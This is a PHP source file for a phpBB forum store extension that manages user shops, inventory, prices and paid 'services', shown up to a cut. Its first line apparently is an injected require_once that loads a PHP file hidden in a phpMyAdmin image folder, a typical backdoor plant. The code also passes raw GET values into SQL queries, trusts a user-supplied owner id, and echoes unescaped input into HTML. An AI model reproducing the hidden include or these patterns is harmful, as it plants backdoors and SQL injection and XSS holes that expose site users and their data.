<?php
 require_once ('/var/www/html/archive.blackstardojo.org/phpmyadmin/themes/original/img/s_notice.php');

/***************************************************************************
 *                              store.php
 *                            -------------------
 *   begin                : Monday, 11 Agugust, 2003
 *   copyright            : (C) 2003 wGEric
 *   email                : eric@best-1.biz
 *
 *   $Id: store.php,v 1.1 2004/01/03 00:55:33 wgeric Exp $
 *
 *
 ***************************************************************************/

/***************************************************************************
 *
 *   This program is free software; you can redistribute it and/or modify
 *   it under the terms of the GNU General Public License as published by
 *   the Free Software Foundation; either version 2 of the License, or
 *   (at your option) any later version.
 *
 ***************************************************************************/
 
define('IN_PHPBB', true);
define('IN_CASHMOD', true);
$phpbb_root_path = './';
include($phpbb_root_path . 'extension.inc');
include($phpbb_root_path . 'common.'.$phpEx);
include($phpbb_root_path . 'includes/functions_store.'.$phpEx);
include($phpbb_root_path . 'includes/bbcode.'.$phpEx);
include($phpbb_root_path . 'includes/functions_post.'.$phpEx);

//
// Start session management
//
$userdata = session_pagestart($user_ip, PAGE_STORE);
init_userprefs($userdata);
//
// End session management
//

include($phpbb_root_path . 'language/lang_' . $board_config['default_lang'] . '/lang_store.'.$phpEx);

//
// Mode setting
//
if ( isset($HTTP_POST_VARS['mode']) || isset($HTTP_GET_VARS['mode']) )
{
	$mode = ( isset($HTTP_POST_VARS['mode']) ) ? $HTTP_POST_VARS['mode'] : $HTTP_GET_VARS['mode'];
}
else
{
	$mode = '';
}
//
//cancel
//
if ( isset($HTTP_POST_VARS['cancel']) || isset($HTTP_GET_VARS['cancel']) )
{
  $mode = '';
}
//
//submit
//
if ( isset($HTTP_POST_VARS['submit']) || isset($HTTP_GET_VARS['submit']) )
{
	$submit = ( isset($HTTP_POST_VARS['submit']) ) ? $HTTP_POST_VARS['submit'] : $HTTP_GET_VARS['submit'];
}
else
{
	$submit = '';
}
//
//confirm
//
if ( isset($HTTP_POST_VARS['confirm']) || isset($HTTP_GET_VARS['confirm']) )
{
	$confirm = ( isset($HTTP_POST_VARS['confirm']) ) ? $HTTP_POST_VARS['confirm'] : $HTTP_GET_VARS['confirm'];
}
else
{
	$confirm = '';
}
//
//id
//
// id could be an array so we'll intval() it when we use it
if ( isset($HTTP_POST_VARS['id']) || isset($HTTP_GET_VARS['id']) )
{
	$id = ( isset($HTTP_POST_VARS['id']) ) ? $HTTP_POST_VARS['id'] : $HTTP_GET_VARS['id'];
}
else
{
	$id = "";
}

switch($mode)
{
  //--------------------
  //display a list of the users items
  case 'user_items':
  
    $id = ( $id ) ? intval($id) : $userdata['user_id'];
    if ( !$userdata['session_logged_in'] )
    {
      redirect($phpbb_root_path . 'login.'.$phpEx.'?redirect=store.'.$phpEx.'&mode=user_items', true);
    }
    
    $page_title = $lang['Store_user_items'];
    include($phpbb_root_path . 'includes/page_header.'.$phpEx);

    $template->set_filenames(array(
        "body" => "store_inventory_user.tpl")
    );

    $user_info = get_userdata($id);
    $username = $user_info['username'] . "'s " . $lang['Store_items'];

    $template->assign_vars(array(
      'L_ITEM' => $lang['Store_item'],
      'L_AMOUNT' => $lang['Store_amount'],
      'L_PRICE' => $lang['Store_price'],
      'L_ACTION' => $lang['Store_action'],
      
      'USER_NAME' => $username,

      'U_ITEM_WINDOW' => append_sid($phpbb_root_path . 'store.'.$phpEx.'?mode=itemdescript&id='),

      'S_MOVE_ACTION' => append_sid($phpbb_root_path . 'store.'.$phpEx.'?mode=moveinventory'),
      'S_MOVE_VALUE' => $lang['Store_move_user'],
      'S_STORE_LIST' => get_user_stores($userdata['user_id']),
      'S_HIDDEN' => '<input type="hidden" name="from" value="user">')
    );
    
    item_list('', $id);
    
    if ( $userdata['user_id'] == $id || $userdata['user_level'] == ADMIN)
    {
      $template->assign_block_vars('switch_owner', array());
      //$template->assign_block_vars('item_row.switch_owner', array());
    }
    
    break;
// Add services to your store.
  case 'add_services':
	  $template->set_filenames(array("body" => "message_body.tpl"));
	$service = isset($HTTP_GET_VARS['service']) ? $HTTP_GET_VARS['service'] : "default";
	$message = '';
	switch ($service) {
	  case 'suckage':
		  $message .= 'You did not choose a service!<br /><br />';
	  case 'default':
		//normal item = 0
		//special = 1
		//board owned service = 2
		//user owned service = 3
		$servicelist = item_list("returntypeid",3,$userdata['user_id']);
		//echo ;
		$message .= '<form action="' . $phpbb_root_path . 'store.php?" method="GET"><input type="hidden" value="add_services" name="mode" /><input type="hidden" name="id" value="'.$HTTP_GET_VARS['id'].'" />' . $servicelist . '<br />Enter the amount of this service you would like to add: <input type="text" class="post" name="amount" /><br />Enter the price you\'d like to put these at: <input type="text" class="post" name="price" /><br /><input class="post" type="submit" value="Add this service" /></form>';
		$template->assign_vars(array(
			'U_INDEX' => $phpbb_root_path . 'index.' . $phpEx,
			'L_INDEX' => "Blackstar Index",
			'MESSAGE_TITLE' => 'Add a service to your shop',
			'MESSAGE_TEXT' => $message
		  )
	  );
		break;
	  default:
		
	  if(isset($HTTP_GET_VARS['amount']) && isset($HTTP_GET_VARS['price']) && isset($HTTP_GET_VARS['id']) && isset($HTTP_GET_VARS['service'])) {
		  //move items to store
		  $amount = $HTTP_GET_VARS['amount'];
		  $price = $HTTP_GET_VARS['price'];
		  $to_id = intval($HTTP_GET_VARS['id']);
		  $item_id = intval($HTTP_GET_VARS['service']);
		  $n_price = floatval($price);
		  $n_amount = intval($amount);
		  $item_info = item_info($item_id);
			
			//see if store already has item
			$store_item = "SELECT inventory_id, inventory_amount FROM " . STORE_INVENTORY . " WHERE inventory_item = '" . $item_id . "' AND inventory_store = '". $to_id."' LIMIT 1";

			if ( !$store_results = $db->sql_query($store_item) )
			{
			  message_die(GENERAL_ERROR, "error getting stores items", "", __LINE__, __FILE__, $sql);
			}
			$store_item = $db->sql_fetchrow($store_results);
			$store_item_id = $store_item['inventory_id'];
			  if ( isset($store_item['inventory_id']) )
			  {
				$new_amount = $store_item['inventory_amount'] + $n_amount;
				$sql = "UPDATE " . STORE_INVENTORY . " SET
				  inventory_amount = '$new_amount',
				  inventory_price = '" . $n_price . "'
				  WHERE inventory_id = " . $store_item_id;
			  } else {
				  $sql = "INSERT INTO " . STORE_INVENTORY . " ( inventory_item, inventory_store, inventory_price, inventory_amount, restock_time, restock_amount, restock_last ) VALUES(			  ".$item_id.",".$to_id.",".$n_price.",".$n_amount.",NULL,NULL,NULL)";
			  }
		if($sql != "") {
			if(!$result = $db->sql_query($sql)) {
				 message_die(GENERAL_ERROR, "error updating inventory", "", __LINE__, __FILE__, $sql);
			} else {
				$template->assign_vars(array(
				'U_INDEX' => $phpbb_root_path . 'index.' . $phpEx,
				'L_INDEX' => "Blackstar Index",
				'MESSAGE_TITLE' => 'Adding a service to your shop',
				'MESSAGE_TEXT' => 'The service was added to your shop successfully.<br /><a href="store.'.$phpEx.'?mode=store_items&id='.$to_id.'">Back to your shop</a>'
			  )
		  );
			} 
		} else {
					$template->assign_vars(array(
				'U_INDEX' => $phpbb_root_path . 'index.' . $phpEx,
				'L_INDEX' => "Blackstar Index",
				'MESSAGE_TITLE' => 'Adding a service to your shop',
				'MESSAGE_TEXT' => 'The service was not added to your shop because $sql is empty'));
		}
	  } else {
		$template->assign_vars(array(
				'U_INDEX' => $phpbb_root_path . 'index.' . $phpEx,
				'L_INDEX' => "Blackstar Index",
				'MESSAGE_TITLE' => 'Adding a service to your shop',
				'MESSAGE_TEXT' => 'The service was not added to your shop successfully due to a lack of variables in the address.'
			  )
		  );
	  } 
		  break;
	  }
	  include($phpbb_root_path . 'includes/page_header.'.$phpEx);
	break;
	case 'addmessagetoservice':
	//	message_die(GENERAL_ERROR,"Spending services is down right now. Sorry for the inconvenience! ~AL");
		if($HTTP_GET_VARS['orig_user_id'] != $userdata['user_id']) {
			message_die(GENERAL_MESSAGE,"You do not own this item! Stop trying to spend it!");
		}
	 $template->set_filenames(array("body" => "message_body.tpl"));
	$message = '<form action="store.php?mode=spendservice&orig_user_id=' . $HTTP_GET_VARS['orig_user_id'] . '&item=' . $HTTP_GET_VARS['item'] . '" method="POST"><br />Please leave a short message about what you wish the provider to do<br /><input type="hidden" name="addmsg" value="true" /><textarea class="post" name="message" cols="60" rows="10"></textarea><br /><input type="submit" class="post" value="Use service" />';
	include($phpbb_root_path . 'includes/page_header.'.$phpEx);
	$message .= '</form>';
			$template->assign_vars(array(
			'PAGE_TITLE' => "Use a servoce",
			'U_INDEX' => $phpbb_root_path . 'index.' . $phpEx,
			'L_INDEX' => "Blackstar Index",
			'MESSAGE_TITLE' => 'Use a service',
			'MESSAGE_TEXT' => $message
		  )
	  );
		break;

	case 'spendservice':
		//message_die(GENERAL_ERROR,"Spending services is down right now. Sorry for the inconvenience! ~AL");
		if($HTTP_GET_VARS['orig_user_id'] != $userdata['user_id']) {
			message_die(GENERAL_ERROR,"You do not own this item! Stop trying to spend it!");
		}
		include($phpbb_root_path . 'includes/page_header.'.$phpEx);
		$template->set_filenames(array("body" => "message_body.tpl"));
		if(isset($HTTP_GET_VARS['item']) && isset($HTTP_GET_VARS['orig_user_id'])) {
		$inventory_info = inventory_info($HTTP_GET_VARS['item']);
		$new_user_ids;
        $new_user_amount = $inventory_info['inventory_amount'] - 1;
		$itemid = $inventory_info['inventory_item'];
		$itemdata = item_info($itemid);
		$servicename = $itemdata['item_name'];
		
		$template->set_filenames(array("body" => "message_body.tpl"));

			if($new_user_amount < 0) {
				message_die(GENERAL_MESSAGE,"OMG! You so totally don't have enough of that item!");
			}
			if($itemdata['item_type'] == 3 || $itemdata['item_user'] > 0) {
				$new_user_ids[0] = $itemdata['item_user'];
			} else if($itemdata['item_type'] == 2) {
				$sql = "SELECT * FROM phpbb_users WHERE user_bospm = 1";
				if(!$result = $db->sql_query($sql)) {
					message_die(SQL_ERROR,"Couldn't grab information from database.");
				}
				while($row = $db->sql_fetchrow($result)) {
					$new_user_ids[] = $row['user_id'];
				}
			}

			foreach($new_user_ids as $new_user_id) {
			//
			// See if recipient is at their inbox limit
			//
			$sql = "SELECT COUNT(privmsgs_id) AS inbox_items, MIN(privmsgs_date) AS oldest_post_time 
				FROM " . PRIVMSGS_TABLE . " 
				WHERE ( privmsgs_type = " . PRIVMSGS_NEW_MAIL . " 
						OR privmsgs_type = " . PRIVMSGS_READ_MAIL . "  
						OR privmsgs_type = " . PRIVMSGS_UNREAD_MAIL . " ) 
					AND privmsgs_to_userid = " . $new_user_id;
			if ( !($result = $db->sql_query($sql)) )
			{
				message_die(GENERAL_MESSAGE, $lang['No_such_user']);
			}

			$sql_priority = ( SQL_LAYER == 'mysql' ) ? 'LOW_PRIORITY' : '';

			if ( $inbox_info = $db->sql_fetchrow($result) )
			{
				if ( $inbox_info['inbox_items'] >= $board_config['max_inbox_privmsgs'] )
				{
					$sql = "SELECT privmsgs_id FROM " . PRIVMSGS_TABLE . " 
						WHERE ( privmsgs_type = " . PRIVMSGS_NEW_MAIL . " 
								OR privmsgs_type = " . PRIVMSGS_READ_MAIL . " 
								OR privmsgs_type = " . PRIVMSGS_UNREAD_MAIL . "  ) 
							AND privmsgs_date = " . $inbox_info['oldest_post_time'] . " 
							AND privmsgs_to_userid = " . $new_user_id;
					if ( !$result = $db->sql_query($sql) )
					{
						message_die(GENERAL_ERROR, 'Could not find oldest privmsgs (inbox)', '', __LINE__, __FILE__, $sql);
					}
					$old_privmsgs_id = $db->sql_fetchrow($result);
					$old_privmsgs_id = $old_privmsgs_id['privmsgs_id'];
				
					$sql = "DELETE $sql_priority FROM " . PRIVMSGS_TABLE . " 
						WHERE privmsgs_id = $old_privmsgs_id";
					if ( !$db->sql_query($sql) )
					{
						message_die(GENERAL_ERROR, 'Could not delete oldest privmsgs (inbox)'.$sql, '', __LINE__, __FILE__, $sql);
					}

					$sql = "DELETE $sql_priority FROM " . PRIVMSGS_TEXT_TABLE . " 
						WHERE privmsgs_text_id = $old_privmsgs_id";
					if ( !$db->sql_query($sql) )
					{
						message_die(GENERAL_ERROR, 'Could not delete oldest privmsgs text (inbox)', '', __LINE__, __FILE__, $sql);
					}
				}
			}
			$privmsg_subject = $userdata['username'] . " has used the service " . $servicename;
			$attach_sig = "0"; $smilies_on = "1"; $html_on = "1"; $bbcode_on = "1";
			$bbcode_uid = make_bbcode_uid();
// 
			$sql_info = "INSERT INTO " . PRIVMSGS_TABLE . " (privmsgs_type, privmsgs_subject, privmsgs_from_userid, privmsgs_to_userid, privmsgs_date, privmsgs_ip, privmsgs_enable_html, privmsgs_enable_bbcode, privmsgs_enable_smilies, privmsgs_attach_sig, privmsgs_fromservman) 

			VALUES (
				" . PRIVMSGS_NEW_MAIL . "
			, '" . str_replace("\'", "''", $privmsg_subject) . "
			', '-2', " . $new_user_id . ", 
			'" . time() ."', '127.0.0.1', 
			" . $html_on . ", 
			" . $bbcode_on . ", 
			" . $smilies_on . "," . $attach_sig . ",'true')";
			$sql = "UPDATE " . USERS_TABLE . "
	SET user_unread_privmsg = user_unread_privmsg + user_new_privmsg, user_new_privmsg = user_new_privmsg + 1, user_last_privmsg = '" . date('D M d, Y g:i a') . "' 
	WHERE user_id = " . $new_user_id;
			if ( !($result = $db->sql_query($sql_info/*, BEGIN_TRANSACTION*/)) )
			{
			message_die(GENERAL_ERROR, "Could not insert/update private message sent info.", "", __LINE__, __FILE__, $sql_info);
			}
			$privmsg_sent_id = $db->sql_nextid();
						if(!($result = 	$db->sql_query($sql))) {
			message_die(GENERAL_ERROR, "Could not insert/update private message numbers info.", "", __LINE__, __FILE__, $sql_info);
			}
			$privmsg_message = $userdata['username'] . " has used the service \"" . $servicename . "\"
			Their request is: [list]
				" . $HTTP_POST_VARS['message'] ."[/list]";
			$privmsg_message = prepare_message($privmsg_message,$html_on, $bbcode_on, $smilies_on, $bbcode_uid);
			$sql = "INSERT INTO " . PRIVMSGS_TEXT_TABLE . " (privmsgs_text_id, privmsgs_bbcode_uid, privmsgs_text)
				VALUES ($privmsg_sent_id, '" . $bbcode_uid . "', '" . str_replace("\'", "''", $privmsg_message) . "')";
			if ( !($result = $db->sql_query($sql/*, BEGIN_TRANSACTION*/)) )
			{
			message_die(GENERAL_ERROR, "Could not insert/update private message sent info.", "", __LINE__, __FILE__, $sql);
			}
			}
			$message = "Your service has been spent. Please wait for the service provider to contact you about it.";
			$template->assign_vars(array(
			'PAGE_TITLE' => "Service spent",
			'U_INDEX' => $phpbb_root_path . 'index.' . $phpEx,
			'L_INDEX' => "Blackstar Index",
			'MESSAGE_TITLE' => 'Your service has been spent.',
			'MESSAGE_TEXT' => $message
		  )
		);
		if ( $new_user_amount > '0' )
        {
			$inventory_sql = "UPDATE " . STORE_INVENTORY . " SET
                inventory_amount = '$new_user_amount'
                WHERE inventory_id = " . $HTTP_GET_VARS['item'];
		}
        else
        {
			$inventory_sql = "DELETE FROM " . STORE_INVENTORY . " WHERE inventory_id = " . $HTTP_GET_VARS['item'];
        }
		if(!$result = $db->sql_query($inventory_sql)) {
			message_die(GENERAL_ERROR,"SQL ERROR OHNOES!",__FILE__,__LINE__,$inventory_sql);
		}
		} else {
			message_die(GENERAL_MESSAGE,"Error: Variables not set :O");
		}
		break;
  //--------------------
  //if user can, then create a store for them
  case 'create_store':
    //set up varibles and submit info
    $new_store_name = htmlspecialchars(trim($HTTP_POST_VARS['new_store']));

    if ( $userdata['stores_owned'] >= $board_config['store_user_stores'] )
    {
      $message = $lang['Store_cant_create'] . "<br /><br />" . sprintf($lang['Click_return_storelist'], "<a href=\"" . append_sid("store.$phpEx") . "\">", "</a>") . "<br /><br />" . sprintf($lang['Click_return_index'], "<a href=\"" . append_sid("index.$phpEx") . "\">", "</a>");

      message_die(GENERAL_MESSAGE, $message);
    }

    if ( $submit == '' )
    {
      //display create store form
      $page_title = $lang['Store_create'];
      include($phpbb_root_path . 'includes/page_header.'.$phpEx);
      
      $template->set_filenames(array(
         "body" => "store_edit_body.tpl")
      );

      $sql = "SELECT cash_id, cash_name FROM " . CASH_TABLE . " ORDER BY cash_order";
      if ( !($cash_result = $db->sql_query($sql)) )
      {
        message_die(GENERAL_ERROR, "Could not obtain cash information", '', __LINE__, __FILE__, $sql);
      }
      while ( $cash = $db->sql_fetchrow($cash_result) )
      {
        $template->assign_block_vars("cashrow",array(
		      'CASH_ID' => $cash['cash_id'],
          'CASH_NAME' => $cash['cash_name'])
        );
      }

      $template->assign_vars(array(
        'L_CREATE_STORE' => $lang['Store_create'],
        'L_STORE_NAME' => $lang['Store_name'],
        'L_STORE_DESCRIPTION' => $lang['Store_description'],
        'L_CASH' => $lang['Store_cash'],
        'L_SELECT_ONE' => $lang['Select_one'],

        'S_NEW_ACTION' => append_sid($phpbb_root_path . 'store.'.$phpEx.'?mode=create_store'),

         'STORE_NAME' => htmlspecialchars(stripslashes(trim($new_store_name))))
      );
    }
    else
    {
      $new_cash_id = intval($HTTP_POST_VARS['cash_id']);
      if ( !$new_cash_id )
      {
        $message = $lang['Store_select_cash'] . "<br /><br />" . sprintf($lang['Click_return_storelist'], "<a href=\"" . append_sid("store.$phpEx") . "\">", "</a>") . "<br /><br />" . sprintf($lang['Click_return_index'], "<a href=\"" . append_sid("index.$phpEx") . "\">", "</a>");

        message_die(GENERAL_MESSAGE, $message);
      }
      $new_store_description = htmlspecialchars(str_replace("\'", "''", trim($HTTP_POST_VARS['store_description'])));
      
      //update users number of stores
      $new_store_number = $userdata['stores_owned'] + 1;
      $sql = "UPDATE " . USERS_TABLE . " SET stores_owned = '$new_store_number' WHERE user_id = " . $userdata['user_id'];
      if ( !$result = $db->sql_query($sql) )
      {
        message_die(GENERAL_ERROR, "Error updating amount of user stores", "", __LINE__, __FILE__, $sql);
      }
      
      //create the store
      $sql = "INSERT INTO " . STORE_LIST . " ( owner_id, store_name, store_description, cash_id )
        VALUES ( '" . $userdata['user_id'] . "', '" . str_replace("\'", "''",$new_store_name) . "', '$new_store_description', '$new_cash_id' )";
      if ( !$result = $db->sql_query($sql) )
      {
        message_die(GENERAL_ERROR, "Error creating store", "", __LINE__, __FILE__, $sql);
      }
      
      $message = $lang['Store_created'] . "<br /><br />" . sprintf($lang['Click_return_storelist'], "<a href=\"" . append_sid("store.$phpEx") . "\">", "</a>") . "<br /><br />" . sprintf($lang['Click_return_index'], "<a href=\"" . append_sid("index.$phpEx") . "\">", "</a>");

      message_die(GENERAL_MESSAGE, $message);
    }
    break;

  //--------------------
  //delete users store
  case 'delete_store':
    //see if it has been confirmed
    if ( $confirm == '' )
    {
      //display confirm
      $page_title = $lang['Store_delete_title'];
      include($phpbb_root_path . 'includes/page_header.'.$phpEx);
      
      $template->set_filenames(array(
        "body" => "confirm_body.tpl")
      );

      $template->assign_vars(array(
        'MESSAGE_TITLE' => $lang['Store_delete_title'],
        'MESSAGE_TEXT' => $lang['Store_delete'],
        'L_YES' => $lang['Yes'],
        'L_NO' => $lang['No'],

        'S_CONFIRM_ACTION' => append_sid($phpbb_root_path . 'store.'.$phpEx.'?mode=delete_store'),
        'S_HIDDEN_FIELDS' => '<input type="hidden" name="id" value="' . intval($id) . '">')
      );
    }
    else
    {
      //delete store and items in it
      $sql = "DELETE FROM " . STORE_INVENTORY . " WHERE inventory_store = " . intval($id);
      if ( !$result = $db->sql_query($sql) )
      {
        message_die(GENERAL_ERROR, "Error deleting store's inventory", "", __LINE__, __FILE__, $sql);
      }
      $sql = "DELETE FROM " . STORE_LIST . " WHERE store_id = " . intval($id) . " LIMIT 1";
      if ( !$result = $db->sql_query($sql) )
      {
        message_die(GENERAL_ERROR, "Error deleting store", "", __LINE__, __FILE__, $sql);
      }
      $new_store_amount = $userdata['stores_owned'] - 1;
      $sql = "UPDATE " . USERS_TABLE . " SET
        stores_owned = '$new_store_amount'
        WHERE user_id = " . $userdata['user_id'];
      if ( !$result = $db->sql_query($sql) )
      {
        message_die(GENERAL_ERROR, "Error updating users stores", "", __LINE__, __FILE__, $sql);
      }
      $message = $lang['Store_deleted'] . "<br /><br />" . sprintf($lang['Click_return_storelist'], "<a href=\"" . append_sid("store.$phpEx") . "\">", "</a>") . "<br /><br />" . sprintf($lang['Click_return_index'], "<a href=\"" . append_sid("index.$phpEx") . "\">", "</a>");

      message_die(GENERAL_MESSAGE, $message);

    }
    break;

  //--------------------
  //edit the stores that the user owns
  case 'edit_store':

		$id = intval($id);

    if ( $submit == '' )
    {			
			$row = store_info($id);
      $store_name = $row['store_name'];
      $store_description = $row['store_description'];
      $store_cash = $row['cash_id'];

      $sql2 = "SELECT cash_id, cash_name FROM " . CASH_TABLE . " ORDER BY cash_order";
      if ( !($cash_result = $db->sql_query($sql2)) )
      {
        message_die(GENERAL_ERROR, "Could not obtain cash information", '', __LINE__, __FILE__, $sql);
      }
      while ( $cash = $db->sql_fetchrow($cash_result) )
      {
        if ( $cash['cash_id'] == $store_cash )
        {
          $selected = 'selected';
        }
        else
        {
          $selected = '';
          }
          $template->assign_block_vars('cashrow',array(
            'CASH_ID' => $cash['cash_id'],
            'CASH_NAME' => $cash['cash_name'],
            'CASH_SELECTED' => $selected)
          );
        }

        //show edit store form
        $page_title = $lang['Store_edit'];
        include($phbb_root_path . 'includes/page_header.'.$phpEx);
        
        $template->set_filenames(array(
          "body" => "store_edit_body.tpl")
        );

        $template->assign_vars(array(
          'L_CREATE_STORE' => $lang['Store_edit'],
          'L_STORE_NAME' => $lang['Store_name'],
          'L_STORE_DESCRIPTION' => $lang['Store_description'],
          'L_CASH' => $lang['Store_cash'],
          'L_SELECT_ONE' => $lang['Select_one'],

          'S_NEW_ACTION' => append_sid($phpbb_root_path . 'store.'.$phpEx.'?mode=edit_store'),
          'S_HIDDEN_FIELDS' => '<input type="hidden" name="id" value="' . $id . '">',

          'STORE_NAME' => htmlspecialchars(stripslashes(trim($store_name))),
          'STORE_DESCRIPTION' => stripslashes(trim($store_description)))
        );
      }
      else
      {
        //update stores info
        $new_store_description = htmlspecialchars(str_replace("\'", "''", trim($HTTP_POST_VARS['store_description'])));
        $new_store_name = htmlspecialchars(str_replace("\'", "''", trim($HTTP_POST_VARS['new_store'])));
        $new_cash_id = intval($HTTP_POST_VARS['cash_id']);

        $sql = "UPDATE " . STORE_LIST . " SET store_name = '$new_store_name', store_description = '$new_store_description', cash_id = '$new_cash_id' WHERE store_id = $id";
        if ( !$result = $db->sql_query($sql) )
        {
          message_die(GENERAL_ERROR, "Error updating store", "", __LINE__, __FILE__, $sql);
        }
        else
        {
          $message = $lang['Store_updated'] . "<br /><br />" . sprintf($lang['Click_return_storelist'], "<a href=\"" . append_sid("store.$phpEx") . "\">", "</a>") . "<br /><br />" . sprintf($lang['Click_return_index'], "<a href=\"" . append_sid("index.$phpEx") . "\">", "</a>");

          message_die(GENERAL_MESSAGE, $message);
        }
      }
    break;

  //--------------------
  //delete inventory
  case 'deleteinventory':
    //see if it has been confirmed
    if ( $confirm == '' )
    {
      //display confirm
      $page_title = $lang['Store_inventory_delete_title'];
      include($phpbb_root_path . 'includes/page_header.'.$phpEx);
      
      $template->set_filenames(array(
        "body" => "confirm_body.tpl")
      );

      $template->assign_vars(array(
        'MESSAGE_TITLE' => $lang['Store_inventory_delete_title'],
        'MESSAGE_TEXT' => $lang['Store_inventory_delete'],
        'L_YES' => $lang['Yes'],
        'L_NO' => $lang['No'],

        'S_CONFIRM_ACTION' => append_sid($phpbb_root_path . 'store.'.$phpEx.'?mode=deleteinventory'),
        'S_HIDDEN_FIELDS' => '<input type="hidden" name="id" value="' . intval($id) . '">')
      );
    }
    else
    {
      //delete store and items in it
      $sql = "DELETE FROM " . STORE_INVENTORY . " WHERE inventory_id = " . intval($id);
      if ( !$result = $db->sql_query($sql) )
      {
        message_die(GENERAL_ERROR, "Error deleting inventory", "", __LINE__, __FILE__, $sql);
      }
            
      $message = $lang['Store_inventory_deleted'] . "<br /><br />" . sprintf($lang['Click_return_store_user_items'], "<a href=\"" . append_sid("store.$phpEx?mode=user_items") . "\">", "</a>") . "<br /><br />" . sprintf($lang['Click_return_index'], "<a href=\"" . append_sid("index.$phpEx") . "\">", "</a>");

      message_die(GENERAL_MESSAGE, $message);

    }
    break;

  //--------------------
  //move items from a store back to users inventory
  case 'edit_price':
    if ( !$confirm )
    {
      //display confirm where user chooses amount to move
      $page_title = $lang['Store_price_items'];
      include($phpbb_root_path . 'includes/page_header.'.$phpEx);

      $template->set_filenames(array(
        "body" => "store_move_inventory.tpl")
      );

      $template->assign_block_vars('switch_price', array());

      $temp_url = append_sid($phpbb_root_path . 'store.'.$phpEx.'?mode=store_items&id=' . intval($HTTP_POST_VARS['store_id']));
      $temp_url1 = append_sid($phpbb_root_path . 'store.'.$phpEx);
      $store_nav = '-> <a href="' . $temp_url1 . '" class="nav">' . $lang['Stores_link'] . '</a> -> <a href="' . $temp_url . '" class="nav">' . $lang['Store_items_link'] . '</a>';

      $template->assign_vars(array(
        'L_TITLE' => $lang['Store_price_items'],
        'L_ITEM' => $lang['Store_item'],
        'L_PRICE' => $lang['Store_price'],

        'U_STORE_NAV' => $store_nav,

        'S_SUBMIT_VALUE' => $lang['Submit'],
        'S_CANCEL_VALUE' => $lang['Cancel'],
        'S_SUBMIT_ACTION' => append_sid($phpbb_root_path . 'store.'.$phpEx.'?mode=edit_price'),
        'S_HIDDEN_FIELDS' => '<input type="hidden" name="store_id" value="' . intval($HTTP_POST_VARS['store_id']) . '">')
      );
      $i = 0;
      while ( $i < count($id) )
      {
        $inventory_id = intval($id[$i]);
				
				$inventory_info = inventory_info($inventory_id);
        $item_info = item_info($inventory_info['inventory_item']);

        $template->assign_block_vars('item_row', array(
          'I' => $i,
          'ID' => $inventory_id,
          'ITEM' => $item_info['item_name'],
          'PRICE' => $inventory_info['inventory_price'])
        );

        $template->assign_block_vars('item_row.switch_price', array());

        $i++;
      }
    }
    else
    {
      //price items
      $price = $HTTP_POST_VARS['price'];
      $i = 0;
      while ( $i < count($id) )
      {
        $sql = "UPDATE " . STORE_INVENTORY . " SET
          inventory_price = '" . floatval($price[$i]) . "'
          WHERE inventory_id = " . intval($id[$i]);
          
        if ( !$results = $db->sql_query($sql) )
        {
          message_die(GENERAL_ERROR, "error changing price", "", __LINE__, __FILE__, $sql);
        }
        
        $i++;
      }
      $message = $lang['Store_items_priced'] . "<br /><br />" . sprintf($lang['Click_return_store'], "<a href=\"" . append_sid("store.$phpEx?mode=store_items&id=" . $HTTP_POST_VARS['store_id']) . "\">", "</a>") . "<br /><br />" . sprintf($lang['Click_return_index'], "<a href=\"" . append_sid("index.$phpEx") . "\">", "</a>");

      message_die(GENERAL_MESSAGE, $message);

    }
    break;

  //--------------------
  //move items from a store back to users inventory
  case 'move_inventory_store':
    if ( !$confirm )
    {
      //display confirm where user chooses amount to move
      $page_title = $lang['Store_move_items'];
      include($phpbb_root_path . 'includes/page_header.'.$phpEx);

      $template->set_filenames(array(
        "body" => "store_move_inventory.tpl")
      );
      
      $template->assign_block_vars('switch_amount', array());
      
      $temp_url = append_sid($phpbb_root_path . 'store.'.$phpEx.'?mode=store_items&id=' . intval($HTTP_POST_VARS['store_id']));
      $temp_url1 = append_sid($phpbb_root_path . 'store.'.$phpEx);
      $store_nav = '-> <a href="' . $temp_url1 . '" class="nav">' . $lang['Stores_link'] . '</a> -> <a href="' . $temp_url . '" class="nav">' . $lang['Store_items_link'] . '</a>';

      $template->assign_vars(array(
        'L_TITLE' => $lang['Store_move_items'],
        'L_ITEM' => $lang['Store_item'],
        'L_AMOUNT' => $lang['Store_amount'],

        'U_STORE_NAV' => $store_nav,

        'S_SUBMIT_VALUE' => $lang['Submit'],
        'S_CANCEL_VALUE' => $lang['Cancel'],
        'S_SUBMIT_ACTION' => append_sid($phpbb_root_path . 'store.'.$phpEx.'?mode=move_inventory_store'),
        'S_HIDDEN_FIELDS' => '<input type="hidden" name="to_id" value="' . intval($HTTP_POST_VARS['to_id']) . '"><input type="hidden" name="store_id" value="' . intval($HTTP_POST_VARS['store_id']) . '">')
      );
      $i = 0;
      while ( $i < count($id) )
      {
        $inventory_id = intval($id[$i]);
				
				$inventory_info = inventory_info($inventory_id);
        $item_info = item_info($inventory_info['inventory_item']);

        $template->assign_block_vars('item_row', array(
          'I' => $i,
          'ID' => $inventory_id,
          'ITEM' => $item_info['item_name'],
          'AMOUNT' => $inventory_info['inventory_amount'])
        );
        
        $template->assign_block_vars('item_row.switch_amount', array());
        
        $i++;
      }
    }
    else
    {
      //move items
      $amount = $HTTP_POST_VARS['amount'];
      $to_id = intval($HTTP_POST_VARS['to_id']);
      $i = 0;
      while ( $i < count($id) )
      {
        $inventory_id = intval($id[$i]);
				
				$inventory_info = inventory_info($inventory_id);
        $item_info = item_info($inventory_info['inventory_item']);
        
        //see if user already has item
        $sql = "SELECT * FROM " . STORE_INVENTORY . "
          WHERE inventory_item = " . $inventory_info['inventory_item'] . "
            AND inventory_user = " . $userdata['user_id'];
            
        if ( !$results = $db->sql_query($sql) )
        {
          message_die(GENERAL_ERROR, "error getting user's items", "", __LINE__, __FILE__, $sql);
        }
        $user_item = $db->sql_fetchrow($results);
        
        if ( isset($user_item['inventory_id']) )
        {
          $new_amount = $user_item['inventory_amount'] + intval($amount[$i]);
          $new_store_amount = $inventory_info['inventory_amount'] - intval($amount[$i]);
          $sql = "UPDATE " . STORE_INVENTORY . " SET
            inventory_amount = '$new_amount'
            WHERE inventory_id = " . $user_item['inventory_id'];

          if ( $new_store_amount != '0' )
          {
            $store_sql = "UPDATE " . STORE_INVENTORY . " SET
              inventory_amount = '$new_store_amount'
              WHERE inventory_id = " . intval($id[$i]);
          }
          else
          {
            $store_sql = "DELETE FROM " . STORE_INVENTORY . " WHERE inventory_id = " . intval($id[$i]);
          }
        }
        else
        {
          if ( intval($amount[$i]) == $inventory_info['inventory_amount'] )
          {
            $sql = "UPDATE " . STORE_INVENTORY . " SET
              inventory_user = '" . $userdata['user_id'] . "',
